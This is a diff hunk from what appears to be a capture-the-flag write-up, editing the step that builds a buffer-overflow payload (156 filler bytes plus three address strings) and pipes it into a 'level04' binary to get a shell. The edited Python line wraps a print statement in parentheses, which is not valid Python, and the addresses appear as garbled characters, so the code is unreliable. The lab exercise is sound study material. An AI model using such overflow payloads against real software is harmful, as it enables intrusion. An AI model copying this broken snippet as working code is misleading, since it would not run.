@@ -88,7 +88,7 @@ Construct the payload with the addresses found:
 Save the payload to a file and run the program:
 
 ```bash
-$ python -c 'print "B"*156+"Ð®æ÷"+"pëå÷"+"ìø÷"' > /tmp/payload
+$ python -c '(print "B"*156+"Ð®æ÷"+"pëå÷"+"ìø÷")' > /tmp/payload
 $ cat /tmp/payload - | ./level04
 Give me some shellcode, k
 whoami
